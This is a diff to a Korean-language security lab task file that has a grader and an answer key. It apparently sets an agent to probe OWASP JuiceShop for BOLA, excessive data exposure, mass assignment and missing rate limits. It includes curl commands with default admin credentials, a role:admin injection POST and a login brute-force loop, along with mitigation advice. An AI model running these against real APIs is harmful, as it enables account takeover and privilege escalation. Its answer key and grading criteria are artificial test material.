@@ -175,7 +175,9 @@ steps:
     공격자가 role, isAdmin 같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다.'
   verify:
     type: output_contains
-    expect: email
+    expect:
+    - email
+    - admin
     field: stdout
     semantic:
       intent: Mass Assignment (OWASP API6) — 등록 API 에 role 또는 isAdmin 필드를 추가 전송해 권한
@@ -225,7 +227,9 @@ steps:
     브루트포스, 크리덴셜 스터핑 공격이 가능합니다. 20회 시도 후에도 429(Too Many Requests)가 발생하지 않으면 취약합니다.'
   verify:
     type: output_contains
-    expect: Rate Limit Test Complete
+    expect:
+    - Rate Limit Test Complete
+    - '200'
     field: stdout
     semantic:
       intent: Rate Limiting 부재 — 로그인 API 에 20회 연속 잘못된 비밀번호 시도 후 429/계정잠금 여부 확인
@@ -365,7 +369,9 @@ steps:
     Cache-Control: no-store가 없으면 민감 데이터가 캐시됩니다. CORS는 허용 도메인을 명시적으로 지정해야 합니다.'
   verify:
     type: output_contains
-    expect: Header Analysis Complete
+    expect:
+    - Header Analysis Complete
+    - headers
     field: stdout
     semantic:
       intent: API 응답 보안 헤더 분석 — CORS/X-Content-Type-Options/Cache-Control 등이 올바르게
@@ -564,55 +570,127 @@ steps:
   risk_level: low
   bastion_prompt: API 보안 종합 평가를 수행해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "OWASP API Top 10 4종 매트릭스 점검 — Excessive Data + BOLA + Mass Assignment + Rate Limit"
 
-    1) JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색해줘
+    ## 상황 (w11 → w12 시나리오 연속)
 
-    2) 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data
-    Exposure)을 확인해줘
+    > 선배: "API 보안 주차야. OWASP API Top 10 (2023) 중 핵심 4종 — API1 BOLA, API3 Excessive Data,
+    > API4 Rate Limit, API6 Mass Assignment. 한 번에 점검하고 매트릭스 만들어. 각각 PoC 명령 + 차단 권고까지."
 
-    3) Broken Object Level Authorization(BOLA) 취약점을 테스트해줘
+    학습 목표 (lecture #1·#2·#3·#4 API/인증/Rate Limit/Swagger) + (lab #2·#3·#4·#5 Excessive/BOLA/Mass/Rate) 통합.
 
-    4) Mass Assignment 공격을 수행해줘
+    ## 임무 (3 단계, 약 35분)
 
-    5) Rate Limiting 부재를 확인해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ### Phase A — API 매핑 + Excessive Data Exposure (lab #1·#2)
+    1) `curl -s "http://10.20.30.80/api/" "http://10.20.30.80/rest/" "http://10.20.30.80/api-docs"
+        | head -c 200`
+    2) Excessive Data: `curl -s "http://10.20.30.80/api/Users/" | python3 -m json.tool 2>/dev/null | head -50`
+       응답에 password / role / token 같은 *과도 노출* 필드 존재 여부 확인.
+
+    ### Phase B — BOLA + Mass Assignment + Rate Limit (lab #3·#4·#5)
+    1) BOLA — w09 와 유사하지만 다른 endpoint:
+       `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+        http://10.20.30.80/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
+       `for id in 1 2 3 4 5; do
+         curl -s -o /dev/null -w "Address/$id: %{http_code}\n" -H "Authorization: Bearer $JWT"
+         http://10.20.30.80/api/Addresss/$id; done`
+    2) Mass Assignment:
+       `curl -s -i -X POST -H "Content-Type: application/json"
+        -d '{"email":"mass'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}'
+        http://10.20.30.80/api/Users/` 응답에서 role/isAdmin 필드가 저장됐는지 확인.
+    3) Rate Limit (lab #5):
+       `for i in $(seq 1 20); do
+         curl -s -o /dev/null -w "$i: %{http_code} "
+         -X POST -H "Content-Type: application/json" -d '{"email":"x@x.com","password":"wrong"}'
+         http://10.20.30.80/rest/user/login; done; echo`
+       20회 모두 401 → rate limit 없음 / 일부 429 → rate limit 있음.
+
+    ### Phase C — OWASP API Top 10 4종 매트릭스 + 권고
+    | OWASP API ID | 취약점 | 점검 결과 | 차단 권고 |
+    | API1:2023 | BOLA | (Phase B-1 결과) | 객체 owner 검증 + permission engine |
+    | API3:2023 | Excessive Data | (Phase A-2 결과) | DTO + field allowlist |
+    | API4:2023 | Resource Consumption | (Phase B-3 결과) | rate limit + IP block |
+    | API6:2023 | Mass Assignment | (Phase B-2 결과) | strict schema + drop unknown |
+    표 끝 "JuiceShop 권고: DTO + owner check + rate limit + schema validation 통합 적용" 한 줄.
+
+    종료: echo "=== Phase A API 매핑+Excessive ===" / "=== Phase B BOLA/Mass/Rate ===" /
+    "=== Phase C OWASP API ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w12 OWASP API Top 10 4종 점검]
+
+    JuiceShop (http://10.20.30.80) API 4종 + 매트릭스 3 phase.
+
+    Phase A:
+    1) `curl -s "http://10.20.30.80/api-docs" | head -c 500` (Swagger 노출 확인)
+    2) `curl -s "http://10.20.30.80/api/Users/" | python3 -m json.tool 2>/dev/null | head -50`
+       password / role / token 등 과도 노출 필드 명시.
+
+    Phase B:
+    1) BOLA admin 로그인 + Address 1~5 비교:
+       `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+        http://10.20.30.80/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
+       `for id in 1 2 3 4 5; do
+         curl -s -o /dev/null -w "Address/$id: %{http_code}\n" -H "Authorization: Bearer $JWT"
+         http://10.20.30.80/api/Addresss/$id; done`
+    2) Mass Assignment:
+       `curl -s -i -X POST -H "Content-Type: application/json"
+        -d '{"email":"mass'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}'
+        http://10.20.30.80/api/Users/`
+    3) Rate Limit:
+       `for i in $(seq 1 20); do
+         curl -s -o /dev/null -w "$i: %{http_code} "
+         -X POST -H "Content-Type: application/json" -d '{"email":"x@x.com","password":"wrong"}'
+         http://10.20.30.80/rest/user/login; done; echo`
+
+    Phase C (매트릭스):
+    ```
+    | OWASP API ID | 취약점 | 점검 결과 | 차단 권고 |
+    | API1:2023 | BOLA | (B-1) | 객체 owner 검증 |
+    | API3:2023 | Excessive Data | (A-2) | DTO + field allowlist |
+    | API4:2023 | Resource Consumption | (B-3) | rate limit + IP block |
+    | API6:2023 | Mass Assignment | (B-2) | strict schema + drop unknown |
+    ```
+    표 끝 "JuiceShop 권고: DTO + owner check + rate limit + schema validation 통합 적용" 한 줄.
+
+    종료: echo "=== Phase A 매핑+Excessive ===" / "=== Phase B BOLA/Mass/Rate ===" /
+    "=== Phase C OWASP API ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: api-docs 노출 + Users/ 의 password/role 등 필드 확인.
+    Phase B: bash JWT 변수 + 3 페이즈. Mass Assignment 는 차단되는 게 정상.
+    Phase C: 4행 매트릭스, OWASP API 2023 ID 명시.
+    포인트: API 보안 4 위협 한꺼번에 점검 + 매트릭스.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] API 보안 5작업 — BOLA/mass assign/JWT/rate limit/audit 통합. OWASP API
-        Top 10.'
+      intent: |
+        OWASP API Top 10 (2023) 중 BOLA/Excessive/Rate/Mass 4종 점검 + 매트릭스.
+        lecture #1·#2·#3·#4 + lab #2·#3·#4·#5 동시 행동 증명.
       success_criteria:
-      - 5 API 작업
-      - BOLA
-      - JWT attack
+      - Phase A — api-docs + Users/ 응답 과도 필드 분석
+      - Phase B — JWT + Address loop + Mass POST + 20회 login loop
+      - Phase C — 4행 OWASP API 매트릭스 + 권고
       acceptable_methods:
-      - bastion plan
-      - Burp + Postman
-      - jwt_tool
+      - curl + python3 json.tool / json 파싱
+      - bash for loop + JWT 변수
+      - markdown table
+      - Postman / Burp 추가 가능
       negative_signs:
-      - BOLA 없음
-      - JWT 무시
-      - audit 누락
+      - 4 점검 중 1~2개만
+      - 매트릭스 누락
+      - OWASP API ID 없음
+      - 차단 권고 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) JuiceShop(:3000)의 API 엔드포인트를 체계적으로 매핑하시오. /api/, /rest/ 경로 하위의 모든 리소스를 탐색해줘
-
-    2) 인증 없이 접근 가능한 API에서 사용자 목록을 조회하시오. /api/Users/ 응답에서 과도한 데이터 노출(Excessive Data
-    Exposure)을 확인해줘
-
-    3) Broken Object Level Authorization(BOLA) 취약점을 테스트해줘
-
-    4) Mass Assignment 공격을 수행해줘
-
-    5) Rate Limiting 부재를 확인해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. API 매핑 → BOLA/Mass/Rate → 매트릭스.
+  answer_detail: |
+    JuiceShop 의 4 위협 차단 여부는 endpoint 별. 차단되어도 응답 코드 분석 자체가 학습.
+    OWASP API Top 10 2023 ID 매핑이 핵심.
   script: ''
